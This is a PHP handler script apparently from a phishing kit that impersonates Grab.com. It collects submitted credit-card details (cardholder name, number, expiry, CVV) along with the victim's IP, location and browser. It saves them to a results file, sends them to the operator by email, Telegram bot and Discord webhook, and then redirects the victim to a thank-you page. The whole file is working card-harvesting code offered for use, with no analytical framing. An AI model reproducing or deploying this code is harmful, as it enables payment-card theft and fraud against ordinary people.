<?php
include '../admin/config.php';
include("system.php");
include("detect.php");
$chatId = trim(file_get_contents("../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../admin/config/status_discord.ini"));
$user_ids = trim(file_get_contents("../admin/config/email.ini"));
$webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
extract($_REQUEST);
$file1 = fopen("../results/cc.txt", "a");
fwrite($file1, $cdx5 ."|". $cdx2 ."|". $cdx6 ."|". $cdx7);
fwrite($file1, "\n");
fclose($file1);


# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$cdx5 = $_POST["cdx5"];
$cdx7 = $_POST["cdx7"];
$cdx2 = $_POST["cdx2"];
$cdx6 = $_POST["cdx6"];
$ip		= $_SERVER['REMOTE_ADDR'];

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "
+++++++++++🌐 CoDeX@GRAB.COM CARD  DETAILS 🌐+++++++++++
Name on Card = $cdx5
Card Number  = $cdx2
Expiry Date  = $cdx6
CVV          = $cdx7
+++++++++++🌐 CoDeX@GRAB.COM CARD  DETAILS 🌐+++++++++++

+++++++++++🌐 CoDeX@GRAB.COM IP INFOS 🌐+++++++++++
IP      = $ip
Country = $countryname
City    = $countrycity
TIME = $InfoDATE 
BROWSER = $UserAgent
+++++++++++🌐 CoDeX@GRAB.COM IP INFOS 🌐+++++++++++
";

$msg = "
+++++++++++🌐 CoDeX@GRAB.COM CARD  DETAILS 🌐+++++++++++<br>
Name on Card = $cdx5 <br>
Card Number  = $cdx2 <br>
Expiry Date  = $cdx6 <br>
CVV          = $cdx7 <br>
+++++++++++🌐 CoDeX@GRAB.COM CARD  DETAILS 🌐+++++++++++
<br>
+++++++++++🌐 CoDeX@GRAB.COM IP INFOS 🌐+++++++++++<br>
IP      = $ip  <br>
Country = $countryname <br>
City    = $countrycity <br>
TIME = $InfoDATE <br>
BROWSER = $UserAgent <br>
+++++++++++🌐 CoDeX@GRAB.COM IP INFOS 🌐+++++++++++ <br>

";


// Email send function
$sender = 'From: 💎 C0DeX 💎 <result@codex.com>';
$sub="NEW GRAB.COM CARD  DETAILS FROM [$ip] [$countrycode] ";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$result=mail($user_ids, $sub, $msg, $headers);

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}

header("location: ../thanks.php");
